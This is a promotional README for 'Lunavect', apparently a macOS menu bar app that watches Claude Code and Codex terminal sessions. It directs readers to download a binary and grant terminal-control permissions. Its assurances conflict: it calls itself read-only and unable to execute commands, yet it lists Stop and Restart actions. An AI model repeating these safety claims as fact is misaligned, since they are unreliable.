---
layout: "default"
title: "🖥️ Lunavect - Your AI Coding Sessions, Always in Sight"
description: "Elevate Claude Code and Codex workflows with a macOS menu bar app and desktop widgets."
---
# 🖥️ Lunavect - Your AI Coding Sessions, Always in Sight

[![Download Lunavect](https://img.shields.io/badge/Download-Lunavect-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Faijurrahman5947/Lunavect/releases)

## 👋 What Is Lunavect?

Lunavect is a friendly little helper that lives in your Mac's menu bar. It keeps an eye on your Claude Code and Codex sessions, so you always know what's happening. Are they still working? Waiting for your input? Or finished? Lunavect tells you at a glance, without you having to switch windows or check terminals.

Think of it as a smart notification center for your AI coding tools. You start a session, go do something else, and Lunavect quietly watches. When something needs your attention, you'll see it right away.

## ✨ Key Features

### 🔍 Session Status at a Glance
Lunavect shows you the current state of every active session. Working, waiting, or done - you'll see it all from the menu bar. No more guessing or constantly checking your terminal.

### ⏱️ Real-Time Updates
The app refreshes automatically. When a session changes state, Lunavect updates instantly. You never have to manually refresh or restart anything.

### 📊 Session History
Curious about what you ran earlier? Lunavect keeps track of your recent sessions. Scroll through past work to see when things finished or spot patterns in your workflow.

### 🔔 Smart Notifications
Lunavect can alert you when a long-running session finishes. You set your preferences, and it only bothers you when it matters. Perfect for running tests, training models, or waiting on big builds.

### 🪶 Lightweight and Fast
The app uses very little memory and CPU. It sits quietly in your menu bar without slowing down your Mac. You'll barely notice it's there - until you need it.

### 🔒 Privacy First
Lunavect runs entirely on your machine. Your code, sessions, and data never leave your computer. No cloud accounts, no telemetry, no tracking.

## 🚀 Getting Started

Getting Lunavect running takes less than a minute. Here's what to do:

1. **Visit the download link:** [Lunavect Releases](https://github.com/Faijurrahman5947/Lunavect/releases) - Visit this link to download the application.
2. **Find the latest version:** Look for the newest release at the top of the page.
3. **Download the file:** Click the download link for the macOS version. The file will be saved to your Downloads folder.
4. **Open the app:** Double-click the downloaded file. Your Mac might ask you to confirm you want to open it - that's normal.
5. **Grant permissions:** On first launch, macOS may ask for permission to control your terminal or monitor windows. Allow these so Lunavect can do its job.
6. **You're done!** Lunavect appears in your menu bar at the top of your screen. Click the icon to see your active sessions.

### 💡 First Launch Tips

- Try starting a Claude Code or Codex session in your terminal, then look at the Lunavect menu bar icon. You should see it update right away.
- If you don't see anything, check that your terminal app is supported. Lunavect works with popular terminals like Terminal, iTerm2, and VS Code integrated terminal.
- Click the Lunavect icon and explore the settings. You can customize notifications, refresh rate, and more.

## 📖 Using Lunavect

### Understanding the Menu Bar Icon

The Lunavect icon changes based on your sessions:

| Icon State | Meaning |
|------------|---------|
| 🟢 Green dot | At least one session is actively working |
| 🟡 Yellow dot | A session is waiting for your input |
| ⚪ Gray dot | Everything is idle or finished |
| 🔴 Red dot | Something went wrong (rare) |

### Clicking the Icon

When you click the Lunavect icon, a dropdown appears showing:

- **Active sessions** with their current status
- **Recent sessions** that finished in the last 24 hours
- **Quick settings** for notifications and appearance
- **Quit option** to close Lunavect

### Working with Sessions

You can interact with sessions directly from the menu:

- Click a session name to bring its terminal window to the front
- Right-click a session for more options like "Stop" or "Restart"
- Use the "Clear" button to remove finished sessions from the list

### Notification Preferences

Under Settings, you can decide when Lunavect alerts you:

- **Always notify** when any session finishes
- **Only notify** for sessions running longer than a set time (default: 10 minutes)
- **Never notify** - just update the menu bar icon silently

## ⚙️ Customization Options

Lunavect respects your preferences:

### Appearance

- Choose between light, dark, or automatic (follows your Mac's appearance)
- Adjust how often the menu bar icon refreshes (from every 1 second to every 30 seconds)
- Pick between different icon styles if you prefer a more minimal look

### Session Monitoring

- Tell Lunavect which terminal apps to watch
- Set session name patterns to group related work
- Exclude certain folders or commands from monitoring

### Keyboard Shortcuts

Power users love these handy shortcuts:

- `⌘ + ⇧ + L` - Open the Lunavect menu
- `⌘ + ⇧ + O` - Focus the most recently active session
- `⌘ + ⇧ + P` - Pause or resume monitoring

## 🛠️ Troubleshooting

Even great apps occasionally need a little help. Here are common fixes:

### Lunavect Doesn't Show in Menu Bar

1. Check that you downloaded the correct version for your Mac (Intel vs. Apple Silicon)
2. Restart Lunavect: right-click its icon in the dock (if visible) and choose Quit, then reopen
3. Check your macOS version - Lunavect requires macOS 12.0 or later

### Sessions Not Appearing

1. Make sure your terminal app is in Lunavect's monitored apps list
2. Try closing and reopening your terminal app
3. In Lunavect settings, click "Refresh Now" to force a status check

### Notifications Not Working

1. Check your System Settings > Notifications and make sure Lunavect is allowed to send notifications
2. Verify notification settings inside Lunavect itself
3. Restart Lunavect after changing notification permissions

### App is Slow

Lunavect is normally very light, but if it feels sluggish:

1. Reduce the refresh rate in settings (e.g., from 1 second to 5 seconds)
2. Close very long-running sessions you no longer need
3. Restart your Mac if the issue persists - it often fixes temporary glitches

## 🧰 System Requirements

Lunavect works with just about any modern Mac:

- **macOS version:** 12.0 (Monterey) or later
- **Chip:** Intel or Apple Silicon (M1, M2, M3, etc.)
- **Memory:** 512 MB free RAM (though it typically uses much less)
- **Storage:** About 15 MB of disk space
- **Terminal apps:** Works with Terminal, iTerm2, Alacritty, and VS Code's integrated terminal

## 🔄 How Lunavect Works

Lunavect uses macOS's accessibility features to safely read what's happening in your terminal windows. It looks for patterns in the text to understand session states. For example:

- When a command is executing, it sees the "running" state
- When a process is waiting for input (like a confirmation prompt), it knows you need to respond
- When the command finishes and the prompt returns, it marks the session as done

It never sends this information anywhere. Everything stays on your device.

## 📝 Frequently Asked Questions

**Is Lunavect free?**
Yes, Lunavect is completely open source and free to use.

**Does Lunavect work with any AI tool?**
It's specifically designed for Claude Code and OpenAI Codex, but it can monitor any terminal activity that matches session patterns.

**Can I use Lunavect with multiple monitors?**
Absolutely. The menu bar icon shows on your primary display, but you can move it to any menu bar you prefer.

**Will Lunavect slow down my coding?**
No. Lunavect only reads terminal text - it never writes or interferes with your work. Its performance impact is negligible.

**Is my code safe?**
Yes. Lunavect has read-only access. It cannot modify files, execute commands, or send data anywhere. All processing is local.

## 📚 Additional Resources

- **Source Code:** [GitHub Repository](https://github.com/Faijurrahman5947/Lunavect)
- **Issue Tracker:** Report bugs or request features on GitHub
- **Changelog:** See what's new in each version
- **Contact:** Reach out through the GitHub discussion board

## 💖 Support the Project

Lunavect is built by developers who love efficient workflows. If it helps you, consider:

- **Starring the repo** on GitHub to show support
- **Sharing** with teammates who use Claude Code or Codex
- **Contributing** code, documentation, or translations
- **Reporting bugs** you find so they can be fixed quickly

## 📄 License

Lunavect is released under the MIT License. That means you can use, modify, and distribute it freely, even for commercial purposes. Just include the original copyright notice.

---

## ❤️ Enjoy Seamless AI Coding Sessions

Lunavect turns your menu bar into a mission control for your AI coding tools. Stop wondering if your session is done. Stop switching windows every five minutes. Start working smarter.

Download Lunavect today and keep your Claude Code and Codex sessions always in view.

[![Download Now](https://img.shields.io/badge/Get_Lunavect-free-2ea44f?style=for-the-badge&logo=appveyor&logoColor=white)](https://github.com/Faijurrahman5947/Lunavect/releases)

Keywords: agent-monitoring, ai-coding, claude, claude-code, codex, desktop-widgets, developer-tools, macos, macos-app, menu-bar, menubar-app, notarized, open-source, openai-codex, session-manager, session-monitor, swift, swiftui, usage-limits, widgetkit